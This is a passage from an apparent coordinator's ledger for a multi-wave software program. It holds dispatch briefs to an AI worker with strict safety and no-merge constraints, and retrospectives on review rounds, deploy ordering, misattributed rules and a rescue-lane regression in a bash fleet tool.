>
> Do not update `docs/superpowers/programs/account-pools.md` — the ledger is mine. Do not deploy. Do not merge.

---

**Wave 2a brief, as dispatched 2026-09-06 11:12 UTC (run 33, same worker `ccrc-pwa-clear-meadow`, resumed and cleared):**

> Program `account-pools`, WAVE 2a of 6, run 33. Same workspace, fresh wave — dispatch cleared your context, so everything you knew is in the files below, not in your head.
>
> WHAT THIS WAVE IS. The tag on the fleet box and the one predicate every account decision will ask: `$REG/pools/<project>` storage, `_project_pool_state` (four words, never dies — it runs inside the long-lived `cmd_supervise` loop), `_pool_ok` with its THREE exit codes, the `ccd project-pool` writer verb, the agent grant and the two `CCD_ARGV` builders, fresh placement (`_ws_least_loaded [project]`, `cmd_ws_add`'s refusal), `POOLS_CAP`, the doctor check, and the `rehome` lifecycle act in all three vocabularies. Nine tasks; Task 9 is the whole-branch gate AND the agent-first deploy order.
>
> THIS WAVE IS AGENT-FIRST. It touches `ccd/`, so the fleet host ships before the server. You do NOT deploy — report the fingerprint and I run both lanes in order. Task 9 states the order; read it, do not perform it.
>
> YOUR REQUIREMENTS: the plan `docs/superpowers/plans/2026-09-05-account-pools-wave2a-ccd-tag-placement.md`, then the spec `docs/superpowers/specs/2026-09-04-account-pools-design.md`. Program ledger: `docs/superpowers/programs/account-pools.md`. Read the plan's Global Constraints and Wave map once.
>
> WAVE 1 IS MERGED — fetch `origin/main` and build on it. What it produced that you consume, by exact name, none of which you may re-spell: `POOL_NAME_RE` in `shared/roster.ts` (your bash literal is pinned against `POOL_NAME_RE.source`), `AccountDef.pool`, `_ccrc_pool()` in the generated `~/.ccrc/accounts.sh` (your `_acct_pool` reads it), `POOL_RULE_CASES` and `POOLED_TEST_ROSTER` in `server/test/fixtures/poolRule.ts`, and `poolRule` in `shared/poolrule.ts` — the TypeScript spelling your bash `_pool_ok` must agree with case for case, driven through the SAME table.
>
> FOUR THINGS FROM WAVE 1 YOUR PLAN CANNOT SEE:
> 1. `POOLED_TEST_ROSTER` now THROWS at import if a `POOL_BY_ID` key names an id absent from `DEFAULT_TEST_ROSTER`. It was added because a silent miss would have cost your `seedAccountsSh` coverage one `_ccrc_pool` arm invisibly. A mutated fixture fails at COLLECTION with the guard's own message, not as a wrong assertion downstream.
> 2. `accounts.sh` now emits SIX functions, up from five. TWO comments under `ccd/` still say five: `ccd/ccrc-wrapper-shape:41-43` and `ccd/ccrc:1030`. Wave 1 could not touch them — its own gate required an EMPTY `ccd/` diff. **You are in `ccd/` anyway: fix both, this wave.** Wave 5's plan names neither file, so if you skip them nobody else is scheduled to.
> 3. The pool rule's precedence is load-bearing and easy to get wrong invisibly: `unreadable`/`malformed` are decided FIRST, before either untagged shortcut. An unreadable tag over an untagged ACCOUNT still answers undecidable — the constraint is unknown, not absent. Every other row of the table hides this ordering mistake.
> 4. **A hazard wave 1 could not measure and handed you deliberately.** `POOL_RULE_CASES`'s two prefix rows say in their own text that they do NOT cover a bash `==` with an unquoted right side: no fixture pool name carries a glob metacharacter, and the no-real-names constraint means none ever can. You are the wave that can measure it — assert the QUOTING in `_pool_ok` directly rather than hoping a table row reaches it.
> 5. `deviation-refs` green does NOT mean "this block is this branch's alone" — the plans are already on `main`, so the same file defines the same numbers on both sides. Green means no OTHER plan defines an allocator-era number you also define.
>
> EXECUTION SKILL: invoke `superpowers:subagent-driven-development` and run it as written — fresh implementer per task, a review after each, the fix loop capped at five rounds, a whole-branch review at the end, rulings ledgered. Wave 1 ran ~110 findings across seven rounds with every finding handed to an independent refuter; roughly half were refuted. That refutation step is why its guards ended up measuring something. Keep it.
>
> WATCH FOR WAVE 1'S RECURRING DEFECTS, which cost it four fix rounds: (a) guards that measure NOTHING — a scan whose regex ate the line it counts, a row floor one below the row count, a predicate whose mutation left every suite green; prove each guard by MUTATING its subject, not by deleting the gate; (b) comments asserting later-wave machinery as present fact — if wave 2b or 3 owes it, write it as an obligation naming the owing wave, not as a report.
>
> BRANCH: commit on THIS workspace's own branch, never a separate feature branch. Base on `origin/main` after `git fetch origin`. At the end take "push and open a pull request" — never merge; merging is mine.
>
> DONE MEANS: all nine tasks complete, the SDD final review clean or its residuals parked with rulings, Task 9's gates green, branch pushed, PR opened against `main`, all CI checks green. Then mail me `wave-done`.
>
> WAVE-DONE MAIL: `kind:"status"`, `subject:"wave-done"`, `toId:"coordinator"`, `runId` 33, body = prose plus the fingerprint JSON exactly: `{"branchTip":"<40-hex>","prNumber":<n>,"prPhase":"open","handoffCommit":"<the same 40-hex>"}` — both shas identical, measured after your last push. Then STOP PUSHING. Say what waves 2b/3/4/5 need that their plans cannot see.
>
> MAIL: every mail to `coordinator` carries `"runId": 33` — another program is active and the runId-less form will not resolve. Send one `subject:"underway"` line when Task 1's implementer is dispatched. Deviations found during execution: write `D-TBD-<slug>` in full in the plan's `## Deviations found`, mail me `subject:"deviation-request"` with the slugs and count, I mint and mail back, you substitute before wave-done. Never invent a number; the program's D-1663–D-1688 block is fully defined and is not a reserve. Numbers spent so far outside it: D-1741, D-1742 (two rounds), D-1743 — all wave 1.
>
> SAFETY: fixture HOMEs only (`makeCcdHarness`, `mkTmp`, `seedRoster`, `seedAccountsSh`) — never the live `$HOME`, never a `ccd` verb against the live host, never tmux, `~/.cc-sessions`, `~/.cc-limits` or a `claude-session@*` unit. Never print a secret file's contents. `EXEC_COMMANDS` stays `['tmux','ccd']`; no `gh` grant, ever. No real account, pool, host or IP in any tracked file — fixture pools are `pool-a`, `pool-b`, `pool-ab`. Write repo-relative paths in anything you commit; the pre-push hook refuses a blob carrying an absolute worktree path.
>
> ONE RULE FOR YOUR PR, learned at wave 1's merge: eight of that wave's commit messages quoted `D-TBD-` slugs from before the numbers were issued, one as a subject. `dtbd.test.ts` scans file CONTENTS, not messages, so CI is green either way — but a default squash body lands superseded placeholders on `main` forever. Keep placeholder slugs out of commit SUBJECTS, and expect me to write the squash body by hand.
>
> Do not update the program ledger — it is mine. Do not deploy. Do not merge.

---

**Wave 2b brief, as dispatched 2026-09-07 09:16 UTC (run 34, same worker `ccrc-pwa-clear-meadow`, resumed and cleared) — 8083 bytes, composed 8185 against the 8192-byte envelope cap, and four trim passes to get there; the nine numbered carries are the whole point of it:**

> Program `account-pools`, WAVE 2b of 6, run 34. Same workspace, fresh wave — dispatch cleared your context, so everything you knew is in the files below, not in your head.
>
> WHAT THIS WAVE IS. The deciders. Wave 2a gave the fleet a tag and a predicate; you make the machinery ACT on them — the strand, `_swap_target`'s pool insertions, the 5-second tick, the crossing marker and its expiry, `cmd_swap`'s guard and flag, and `--cross-pool` on the four manual verbs. Eight tasks; Task 8 is the whole-branch gate and the deploy ORDER.
>
> THIS WAVE IS AGENT-FIRST — every change is under `ccd/`, so the fleet host ships before the server. You do NOT deploy: report the fingerprint and I run both lanes in order. Task 8 states the order; read it, do not run it.
>
> YOUR REQUIREMENTS: the plan `docs/superpowers/plans/2026-09-05-account-pools-wave2b-ccd-swap-strand-crossing.md`, then its spec `docs/superpowers/specs/2026-09-04-account-pools-design.md`. Read the plan's Global Constraints, Wave map and CONSUMED list once — its safety and no-real-names constraints bind; I do not restate them.
>
> WAVE 2a IS MERGED (`58ef97b6`) AND LIVE ON BOTH LANES — fetch `origin/main` and build on it. Your CONSUMED list is real now; do not re-spell or re-implement any of it.
>
> NINE THINGS FROM 2a YOUR PLAN CANNOT SEE — all obligations.
>
> 1. `_project_pool_state` DOES NOT VALIDATE ITS OWN `$1` — it answers on whatever `$POOLS_DIR/$1` composes to. 2a's callers pass a project already through `_ws_project_valid`; the TICK does not, nor do the four manual verbs. Decide where validation lives for your call sites and pin it. Do not assume the reader guards you.
>
> 2. `_pool_ok` GAINS ITS FIRST TICK AND MANUAL-VERB CALLERS here. 2a swept every comment near it for later-wave claims written as present fact; your diff makes that sweep stale. Run it again over the region you touch.
>
> 3. WRITE DICTATED COMMENTS IN THE OBLIGATION TENSE BY DEFAULT. 2a's most repeated defect, across four rounds, was a comment asserting machinery a later wave owes as present fact. Default spelling: "wave N is to do X", never "wave N does X". If the thing is yours and shipped, name it plainly so a grep finds it — your own code in the future tense is as wrong as the reverse.
>
> 4. `pool-tag-void` IS A NEW `swap.log` LINE CLASS 2a shipped — the writer verb's retraction when the tag it just wrote does not read back. `docs/superpowers/plans/2026-09-05-account-pools-wave5-docs.md:46` enumerates the swap.log classes and does NOT list it, and you add six more. Say so in wave-done, so wave 5 corrects that enumeration once with all seven.
>
> 5. WHEN `--cross-pool` LANDS, D-1798's PROMISE COMES TRUE — go close that entry. It records that the flag is refused TODAY by two different routes, depending on whether the shifted argument happens to name a roster id, both pinned in `server/test/ccd-project-pool.test.ts`. **I am the source of that entry's original false claim** — I wrote "refused by `_is_valid_wrapper`" from one measurement; the flag lands in the `id` slot, which is never wrapper-validated. Task 5 makes the flag real, so those two pins change DELIBERATELY: name them in your diff, say which behaviour the flag replaces, and mail me if either route should survive for another reason.
>
> 6. THE D-1796 TRIP-WIRE. That entry parks a two-arm case on the argument that `unreadable` and `malformed` reach the same DECISION and that `named` is unreachable from a failed read. If anything you write makes `named` reachable from a failed read, or gives the two words different decisions anywhere, **the entry is void and you tell me** — never quietly keep a park your own diff has falsified.
>
> 7. THE FILE/TIME/PLATFORM RULE, 2a's most expensive lesson. A claim about a FILE, about TIME (a cooldown, a jitter window, a tick period) and about a PLATFORM (bash version, kernel, filesystem semantics) are three measurements; evidence for one is not evidence for another. Your plan is dense with time claims — `SWAP_COOLDOWN` 900 s, `SWAPBLOCK_COOLDOWN` 1800 s, D-1675's 120 s jitter, the 5 s tick, D-1676's days-long stale-supervisor window. Measure each on its own axis. Companion rule: **a claim inherited from a review is not measured merely because a reviewer measured something nearby** — 2a shipped two of my false statements into production comments and tests because each rode beside a true one.
>
> 8. RESOLVE THE `D-TBD`/GREEN-CI TENSION EXPLICITLY BEFORE YOUR FINAL ROUNDS. `dtbd.test.ts` refuses a surviving placeholder in tracked file CONTENTS, so the branch cannot be green while one lives — yet late rounds are exactly what produce execution-time deviations. The resolution is ordering: batch the `deviation-request` so it reaches me BEFORE the final gate, substitute, then run Task 8's gates on the substituted tree. A gate green on a tree that still carried a placeholder proves nothing about the tree you push, so a deviation found DURING the gate re-runs it after substitution.
>
> 9. A PREDECESSOR CLAIM I COULD NOT REPRODUCE, handed over with my measurement. `ccd/ccrc-doctor-checks`'s `_check_pools` carries a comment calling the `|| :` after `_ccrc_pool "$a"` load-bearing — that without it a readable-but-pool-less roster reports `unmeasured`. On bash 5.2, with the shape `shared/generate.mjs` actually emits, `_ccrc_pool` returns 0 for an untagged account (an empty `case` and a non-matching `case` both do), so the third state is held by the unconditional `measured` sentinel and the `|| :` is a harmless net. Either exhibit the shape where it fires — if it exists, the comment is right and I want to see it — or soften the comment to say what it is.
>
> EXECUTION SKILL: invoke `superpowers:subagent-driven-development` and run it as written — fresh implementer per task, review after each, fix loop capped at five rounds, whole-branch review at the end. 2a's guards ended up measuring something because every finding went to an independent refuter first: keep that step, and prove each guard by MUTATING its subject, never by deleting the gate.
>
> BRANCH: this workspace's own branch, never a separate feature branch, based on `origin/main` after `git fetch origin`. End with "push and open a pull request" — merging is mine.
>
> DONE MEANS: eight tasks complete, SDD final review clean or residuals parked with rulings, Task 8's gates green, branch pushed, PR opened against `main`, all CI green. Then mail `wave-done`: `kind:"status"`, `subject:"wave-done"`, `toId:"coordinator"`, `runId` 34, body = prose plus the fingerprint JSON exactly `{"branchTip":"<40-hex>","prNumber":<n>,"prPhase":"open","handoffCommit":"<the same 40-hex>"}` — both shas identical, measured ONCE after your last push, then STOP PUSHING. Say what waves 3/4/5 need that their plans cannot see, and answer items 4, 5, 6 and 9 by name.
>
> MAIL: every mail to `coordinator` carries `"runId": 34` — another program is active and the runId-less form will not resolve. Send one `subject:"underway"` line when Task 1's implementer is dispatched. Deviations: write `D-TBD-<slug>` in full in the plan's `## Deviations found`, mail `subject:"deviation-request"` with slugs and count, I mint and mail back, you substitute before the final gate (item 8). Never invent a number, never take one from a gap, never call the allocator. Your plan-time block D-1671–D-1678 is already DEFINED — cite, do not redefine.
>
> SAFETY, the part your plan does not already say: yours is the wave that MOVES SESSIONS, so fixture HOMEs matter more here than anywhere — `makeCcdHarness` only, never the live `$HOME`, never a `ccd` verb against the live host, never tmux, `~/.cc-sessions`, `~/.cc-limits` or a `claude-session@*` unit. `_dispatch_swap`, tmux and `notify.sh` stubbed; `_avail` stays real, steered through the fixture's own limit files.
>
> YOUR PR: keep `D-TBD-` slugs out of commit SUBJECTS — twice now a wave's default squash body would have landed superseded placeholders on `main`, invisibly to CI. I write the squash body by hand.
>
> Do not update the program ledger — it is mine. Do not deploy. Do not merge.

## Wave 2b SHIPPED — 2026-09-08

Merged `4dc87366` (squash, PR #62: 27 commits, 19 files, +3449 −250). Both lanes deployed the same
hour, **SERVER FIRST** at 17:17Z (`/health` → 4dc87366), agent lane at 17:18Z (`ccd` → 4dc87366, all
17 `claude-session@*` units verified active with stable MainPIDs). Run 34 closed `done`; **run 35
(wave 3) was opened BEFORE that close** — zero open runs retires the program irreversibly.
The wave is on `main`, so D-1671–D-1678 (plan-time), D-1868–D-1895 (execution), D-1908–D-1921 (merge
round), D-1955–D-1967 (fix round) and D-1972–D-1976 (round 3) are now full refs, not prefix-less.

### The three-round arc, and the one lesson that generalises

Round 1 fixed D-1915 and introduced D-1962. Round 2 fixed D-1962 and introduced its mirror —
EXISTENCE substituted for AVAILABILITY, when `_swap_target` requires `_pool_ok` AND `_account_ok` AND
`_avail`. Round 3 introduced nothing. The difference was not effort or care; it was **the shape of the
instruction**. Rounds 1–2 said "correct these sentences". Round 3 said **DELETE OR POINT**: every edit
must be a deletion, a pointer to the one normative home, or a verbatim quotation of the three
predicates, and **no new fact may be asserted anywhere**. The output space became "fewer claims"
instead of "different claims", and the regress stopped in one round.

**Carry to every future fix round on prose:** when a correction round produces a new false claim, do
NOT send a longer list. Forbid new assertions. The root was never carelessness — it was one rule
paraphrased in ten hand-written homes, which is the same defect this repo already forbids for values
("enumerated once and derived") and had never applied to prose.

### A coordinator defect of mine, recorded because it cost a cycle

My round-3 brief told the worker to write "the thirteen unrefuted findings" into the carry list. **I
never transmitted them.** Twenty-one findings were reported to me; I passed eight. The worker did not
invent the rest — it wrote in the plan that the coordinator had not sent them, and asked. That is
exactly right, and the defect is mine. **A brief must not ask for a list the brief does not carry.**

### The thirteen, triaged against the shipped tip — not relayed

Round 3 had already closed most of them before I sent any: the pin now extracts and executes the
command the prose cites (not a transcribed copy); `of 39` and `(32 green)` are gone; `REFUSES
placement either way` is gone; the doctor warning is availability-worded; the heading numeral is
pinned. **Two remain open and belong to wave 3:**

- **CARRY W3-1 — the `ccd:NNNN` figure still carries the very defect D-1956 exists to fix.** The prose
  says "143 lines of `ccd:NNNN` citations". Measured on `4dc87366`: the natural
  `grep -cE 'ccd:[0-9]+'` answers **146 lines / 157 occurrences**. 143/154 is reachable only with an
  unstated `ccd:[0-9]{2,}`, which silently drops three real single-digit citations — `ccd:9` at
  `:5603`, `ccd:4` at `:10645` and `:11019`. A count with no named command, and the obvious command
  disagrees with it.
- **CARRY W3-2 — D-1955 closed ONE of the three absence assertions, not three.**
  `BLOCKED_REAL_DISPATCH` stubs `_svc_run_detached` with `return 0`, so the argv IS captured — which
  is what makes the `--cross-pool` mutation detectable, and that arm is genuinely fixed — but
  `cmd_swap` never EXECUTES. The `.crosspool` marker and the `cross-pool` log line are written by
  `_crosspool_mark` and the echo in `cmd_swap`'s success tail, neither of which runs. Those two
  assertions still cannot fail against their real writers. The wave-done mail's "all three … FIXED"
  overstates it.

### The deploy handshake that stopped a silent regression

PR #65 — the trust-dialog incident fix, `af8e75f3` — deployed to the fleet host at 15:59Z, hours
before this wave's own agent lane. **Both lanes install `ccd`.** Deploying wave 2b from the BRANCH
rather than from merged `main` would have shipped a `ccd` without `_answer_two_option_dialog`,
re-breaking the dialog that orphaned five fleet sessions that afternoon — with no test anywhere that
would have noticed. Rule, now standing: **the agent lane installs from MERGED MAIN, never a branch,
and the deploy first asserts `git merge-base --is-ancestor <the other lane's sha> <the sha being
deployed>`.** Asserted here before either lane ran; it passed, and `_answer_two_option_dialog` was
measured byte-identical to main's in the merged file with the trust branch calling it.

### Both carries confirmed — and W3-1 is sharper than I wrote it

The worker re-measured both rather than accepting them, and W3-2 with a MUTATION PAIR rather than by
reading, "because reading is how it got shipped wrong the first time". Probe: an unconditional
`_reg_set "$1" crosspool …` plus a `cross-pool MUTANT` line as the first statement of `cmd_swap`'s
body, so any execution of `cmd_swap` writes both artifacts the case asserts absent. Result: **probe
GREEN (1 passed, 39 skipped), positive control RED at :562** when `--cross-pool` is added to
`_dispatch_swap`'s built command. Green under the probe is the proof: `cmd_swap` never executes under
`BLOCKED_REAL_DISPATCH`, so `:570` and `:571` cannot fail against their real writers (`_crosspool_mark`
at `:14416`, the success-tail echo at `:14670`). One arm of three is mechanised. `ccd/ccd` restored,
tree clean, nothing pushed.

**W3-1 restated, because "the count is wrong" was the wrong diagnosis.** The count is CORRECT and
UNNAMED. Measured identical at `833fd98e`, `cf1c8005` and `4dc87366`: `grep -cE 'ccd:[0-9]+'` → 146
lines / 157 occurrences, `grep -cE 'ccd:[0-9]{2,}'` → 143 / 154, which is exactly what the prose says.
So it is **not staleness and not drift — it is a missing command.** The pattern that makes the number
true was never written down, which is why no re-measurement caught it, and it is one entry away from
D-1956, whose whole subject is a count whose cited command disagrees with it.

### Where the leak actually was: the summary, not the measurement

D-1955's ENTRY is literally accurate — it enumerates all three blindnesses, and its "Fixed by…"
sentence describes only the argv capture and closes "reds exactly THAT CASE", singular. The wave-done
MAIL then summarised it as all three fixed. The entry asserted no more than it measured; the summary
of the entry did. **This is the leak that matters to a coordinator, because a coordinator consumes
summaries** — the same reason coordinator clause 7 says a relayed quote has not been measured. Ask for
the measurement, not the sentence about it.

**And the correction to me did not hold, by the same mechanism.** The worker corrected my claim that
the surviving `39` sits inside a deviation entry, reporting instead a test comment at
`ccd-auto-swap-pool.test.ts:558` and adding that `grep -rn 'of 39\|39 cases\|32 green'` "finds that one
line and nothing else in this program". Measured on `4dc87366`: there are **two** surviving `39`s in
different files, and the plan's one at `:2571` IS inside D-1973's entry (heading at `:2570`). The
three-alternative pattern could not match the plan's phrasing ("said 39 in seven places"), so a
narrower grep carried a wider conclusion. Neither `39` is a live assertion; both describe history.
Recorded because it is the same class as everything above, produced while correcting an instance of it.

### The wave integer is a POSITION, and the rule it was measured against does not exist

Wave 2b's worker reported a live defect: run 35's `wave` field (4) disagrees with its title ("Wave 3
of 6"), the hold reads `program:account-pools wave:4/6`, and the R7 session card — which quotes the
hold verbatim and went live on the fleet at 17:18Z — therefore shows "a wave number one too high" to
every session that starts. It cited `CLAUDE.md`: *"The a/b wave split lives in the run TITLE; the
`wave` field stays an integer (wave 2a = wave 2 of 6)."*

**That sentence is not in `CLAUDE.md`, and not anywhere in tracked text.** Measured three ways:
`grep -n -i 'a/b wave split' CLAUDE.md` empty; every `wave` mention in `CLAUDE.md` read (they concern
run-per-wave ordering, the box-token census and build history, none the integer); `git grep -i 'a/b
wave split'` and `'wave 2a = wave 2'` over the whole tree, both empty. The rule the finding measures
against was invented, and the alarm rests on it.

**What the field actually is.** This program has SIX plan documents — `wave1`, `wave2a`, `wave2b`,
`wave3`, `wave4`, `wave5` — and the `wave` integer has counted POSITION among them since run 32:
1 = wave 1, 2 = wave 2a, 3 = wave 2b (run 34), 4 = wave 3 (run 35). `waveOf: 6` matches that count
exactly. So `wave:4/6` on the hold and on the card is **accurate**: three waves remain, and the one in
progress is the fourth of six. Nothing on the fleet is misreporting.

**The one real blemish is mine, and it is the TITLE, not the field.** Run 35 is titled "Wave 3 of 6 —
the server…", where "3 of 6" reads as a position while the position is 4. Run 34's "Wave 2b of 6" could
not mislead, because `2b` is not a position number. **Convention, stated here because nothing in the
tree states it: the `wave` field is the position; a title names the DOCUMENT and must not repeat a
bare position number it will contradict.** Future titles: "The server wave (plan `wave3`), position 4
of 6".

**And the near-miss worth recording.** Acting on that finding would have meant re-numbering the runs.
There is no update route on the closed client table, so the only path is abandon-and-reopen — and run
34 is already `done`, so abandoning run 35 leaves **zero open runs and retires the program
irreversibly**. A false finding whose remedy is destructive is a different risk class from a false
comment. Measure the rule before acting on a defect measured against it.

The same mail carried a finding that WAS right and that neither of us had: the `39`/`32` census is
**four** survivors, not one or two — `ccd-auto-swap-pool.test.ts:437` and `:558`, plan `:2197` and
`:2571`. My removal check searched for the strings I had removed; its completeness check used the
phrasings it already knew; neither pattern could see the other's counterexample. All four describe
history, so nothing changes — but both verifications were narrower than the claims they carried.

### CORRECTION: the rule was not invented — it was written, by me, where `git grep` cannot see it

The paragraph above says "the rule the finding measures against was invented". **That is false, and it
is the worst kind of false: an exhaustive measurement with a wrong inference drawn from it.** The three
greps were correct — the sentence is not in `CLAUDE.md` and not in tracked text. The conclusion did not
follow. The rule lives at `account-pools-program.md:19` in this project's **shared session memory**,
written by this coordinator session on 2026-09-05, reading *"The a/b wave split lives in the run TITLE;
the `wave` field stays an integer (wave 2a = wave 2 of 6)."* The worker quoted it accurately and
attributed it to the wrong file; I searched the tree, found nothing, and concluded nobody had written
it. **`git grep` cannot see the artifacts that actually steer sessions.** Project memory is loaded into
every session that opens this repo — it steers more sessions than most tracked files do, and it is
invisible to every scanner this repo owns.

So the ledger's verdict stands on substance and falls on that word: the position reading is right,
`wave:4/6` is accurate, the card is truthful, and the remedy really would have retired the program. But
the fix was never "the worker misquoted" — it was **a stale rule sitting in an artifact loaded into
every future session**, which is a live tripwire, not a citation error. Any session that read it,
believed it, and held run authority could have reached the destructive remedy. The worker corrected the
memory in place — the rule, a do-not-raise entry naming the refutation and what the remedy costs, and
the session-card note that had said the card's number was "one high".

**Standing rules this produced, both earned the hard way:**
1. When a finding cites a rule, measure the RULE, and say WHERE you found it — file, line, and whether
   it is tracked text or a memory. A quotation looks like evidence; an attribution is a claim.
2. When a rule you relied on is overturned, go and correct the ARTIFACT that carried it. A rule
   overturned in mail and left standing in memory is raised again, identically, by the next session.
   "Not in tracked text" is not "not written".

One further correction, made in the memory itself: the worker recorded the new rule as an **operator
ruling**. It is not — the operator has said nothing about wave numbering. It is a coordinator ruling by
this session, and it is now labelled so. Marking a coordinator's judgement as the operator's makes it
unchallengeable to every session that reads it next, which is the same defect one level up.

### What the misattribution thread actually proved, and the gap it exposed

Closed 2026-09-08 at four booked misattributions, **two each** — mine: "not in the plan" (the Global
Constraint sentence that was in the plan's Architecture paragraph) and "invented" (a rule I had written
myself). The worker's: the `CLAUDE.md` attribution, and labelling this coordinator's ruling an
**operator** ruling. It named why that last one is the worst form, and it is right: *a citation error
sends a reader to the wrong file; an authority error stops them reading.* A session opening that memory
next would have seen the operator's name on a wave-numbering rule and had no reason to question it —
including a session with run authority, whose only remedy retires the program. The rule therefore has a
third clause: quote the file and line, say whether it is TRACKED TEXT or a MEMORY, and **NAME THE
RULER** — coordinator, operator and worker are three authorities and only one of them ends an argument.

**The finding about our own method, which is the durable one.** All four were found by someone
re-measuring a quotation, and THREE of them were found in the act of correcting the previous one. None
was found by a suite. None was found by the review apparatus either: two multi-agent passes over this
wave — 54 agents, 47 findings, 18 verified survivors — caught false counts, ornamental pins, stale
citations and a mirror-image false claim, **and not one misattribution.** Reviewers check whether a
claim is true of the code. They do not open the document a claim says it came from. *The class is not
caught by review; it is caught by re-reading the source.* Wave 3's review brief must say so explicitly:
for every quotation, open the cited file at the cited line.

**And the structural gap, stated honestly rather than fixed today.** This tree enforces
single-source-of-truth on code (`single-definition.test.ts`), on deviation numbers
(`deviation-refs.test.ts`, `dtbd`) and, since round 3, on prose counts. It enforces **nothing** on
project memory — which is loaded into every session that opens this repo, outranks most tracked files
in practical influence, and is invisible to every scanner the tree owns. This wave's two most expensive
claims were both living there: the wave-numbering rule that produced a destructive-remedy alarm, and
the sentence whose absence from tracked text I read as proof it had never been written. No mechanism is
proposed here — wave 3 is the server and C1's embargo still stands — but the gap is the widest-blast-
radius one this program has found, and it belongs in the record before it is forgotten.

## C1 — merged, held at the deploy, and three corrections to my own ruling (2026-09-08)

C1 merged as `db580771` (#67) at 20:31Z, by the operator, while my review of it was still running. The
review finished at 21:20Z and found six survivors; one of them was already on `main`.

### R1 — the fix opened a live regression in the rescue lane

The two new guards sit at `ccd/ccd:12536-12537` and `return 0` from `_auto_swap_check`; `_swap_target`
(`:12658`), `_strand_mark` (`:12666`) and the `auto-rescue` line (`:12696`) are ALL BELOW them. So a fix
for the crossing marker also deleted the LIMIT-RESCUE lane, which consumes neither value as a crossing
input. A session whose `.home` becomes UNREADABLE — not absent, not empty — and then hits a limit is
never evacuated, every five seconds, forever, with no `.stranded` marker and no notify; the only artifact
is a line in `swap.log`, which nothing in `server/src`, `agent/src`, `shared/` or `pwa/src` reads.
Measured on the merged sha, which is content-identical to the reviewed branch tip.

The worker then supplied the structural half I had only inferred: `_swap_target` consumes `home` in
exactly two places (`:12316`, `:12329-12330`), and an unmeasured `home` fails both and falls through to
the pool loop, which still finds a target — so **the rescue does not need a measured `home`**, which is
precisely what makes refusing the whole tick stronger than the crossing decision required.

### I recommended PROCEED; the operator held; the operator was right, and the hole is worth naming

I weighed a low-probability live regression against C1's benefit and said ship it. **I applied my own
inertness test to the cost and not to the benefit.** C1's benefit is also zero right now — the crossing
defect cannot bite because the embargo means no `.crosspool` marker exists on the box. The trade was
never "small live risk vs real benefit", it was "small live risk vs nothing yet". One deploy will now
carry #66, C1 and C1's fix together.
**Standing rule: when a fix is gated behind a deploy, apply the inertness test to BOTH sides of the
trade. A dormant benefit does not pay for a live risk.**

### Three of ruling 1's four instructions needed correcting by the worker

- **D-2010, mine.** I wrote "if its byte length EXCEEDS 64" — `> 64`. Measured directly:
  `printf 'pool-a%*s' 58 ''` is 64 bytes and `{ IFS= read -r -d '' -n 64 v; }` SUCCEEDS on it, so `ccd`
  answers `malformed`; at 63 bytes the read fails and the tag is accepted. **The boundary is `>= 64`** —
  an off-by-one in a ruling whose entire subject was two readers cutting at the same byte, and `ccd`'s
  own "58+ characters" example, which I quoted to justify the cap, is exactly the input my rule passed.
- **D-2017, mine.** I ordered "treat an embedded NUL the same way"; on the server side that is a NO-OP,
  because `POOL_NAME_RE` already refuses every NUL-bearing content. I specified a guard for a condition
  another guard had closed, and the first case for it passed on the grammar while reading as a pin —
  this program's oldest class, arriving because I specified it. Kept as a DOCUMENTED no-op, which is the
  honest disposition: a no-op labelled as one is fine; a no-op labelled as a mechanism is the defect.
- **R1's scope**, already recorded above.

The instruction that survived intact is the one that mattered — *mirror the cap* — and it survived
**because it was a requirement about behaviour rather than an implementation I dictated.**
**Standing rule: rule at the altitude of the requirement. Every time this coordinator specified the
guard rather than the property, the specification was the thing that was wrong.**

### D-2009 — a guard dead in exactly the state it was written for

My "inert" was wrong as the whole of it. `_project_pool_state`'s empty-argument short-circuit (`:1148`)
PRECEDES its registry-unreadable guard (`:1167`), and the argument arrives from `_reg_get "$id" project`,
which folds unreadable to `""` — so the condition that would fire the guard is the same condition that
empties its argument, and `:1167` cannot fire at any of its three call sites. The ledger sentence is
**"inert at the tag level; one arm already unreachable"**. The worker under-claimed it deliberately
(measuring that the rest of each verb fails too, so what is lost is a clean refusal rather than a proven
bad placement), which is why it could be acted on immediately.

### The constraint became a gate

"No project is tagged until D-2000 lands" governed a capability that is already one command
(`ccd project-pool`, live since wave 2a) and that wave 3 Task 9 puts one tap away in the PWA — a
convention with a speed bump, in this repo's own words for `coordinator-paused`. Replaced:
**wave 3 may be built and merged; wave 3's SERVER DEPLOY is gated on D-2000 landing and deploying.**
Enforceable at the deploy step rather than by anyone's restraint, and it costs the wave nothing.
D-2000 is no longer a wave-5 item: it is a wave-3 deploy prerequisite, taken as its own small ccd PR.

## 2026-09-08 21:45Z — the deploy had already happened, and I was carrying that it had not

I resumed holding "the fleet runs `4dc87366`; the operator has HELD the agent deploy pending the R1
fix." I measured rather than repeated it, and it was false. The installed `~/.local/bin/ccd` hashes
byte-for-byte to `db580771` and was written at **21:10:30Z**, 39 minutes after `db580771` was committed
at 20:31Z. The box has been running C1 — merged #66 and #67 — since then, **without R1's fix**: the
exact state the hold existed to prevent.

**Standing rule: a HOLD is a state of the world, not a decision you can carry forward.** A decision I
recorded stays true until someone reverses it; a hold I recorded is a claim about a box, and boxes move
while a coordinator is asleep. Every fact in a coordinator's standing state that names a machine —
a deployed sha, a running fleet, a held gate — has to be re-measured on resume, not restated. Nothing
in mail told me the deploy had run, and nothing was obliged to.

### R1's live exposure, measured: zero — and zero of the steady state only

C1's guards refuse the whole tick when `_reg_read <id> wrapper` answers non-zero or empty, or when
`_home_measured` answers rc 2. Against every live row: **26 rows, 0 missing `.wrapper`, 0 empty, 0
unreadable, 0 dangling `.home`, `$REG` `-d && -x` true.** One row has an ABSENT `.home` — rc 1, not
rc 2, so `_home_measured` falls through to `_id_wrapper` and decides. **Not one row trips either
guard.** The rescue-lane regression is real in the code and unreachable on the fleet as it stands, so
no rollback is warranted.

What that measurement is NOT: every trip condition is a state a row PASSES THROUGH rather than rests
in — mid-creation before `.wrapper` lands, a field removed out of band, a one-tick permission hiccup.
**Zero at one instant across 26 rows measures the steady state; a 5-second tick lives in the
transient.** The fix ships red-first at the worker's pace, not at emergency speed, and the mutation to
measure is a row whose `.wrapper` is absent while its pane is hard-blocked: pre-C1 it still reached
`_swap_target` and could be rescued off a dead account; post-C1 it logs `_tick_undecidable` and stands
still.

### The embargo is lifted — and the sentence saying so jumped its own gate

D-1999 gated the lift on the DEPLOY, not the merge sha. The deploy is verified by sha, so **the embargo
is lifted as of 21:10Z.** But `ccd/ccd:14766` already asserted "C1, LANDED 2026-09-08, and the EMBARGO
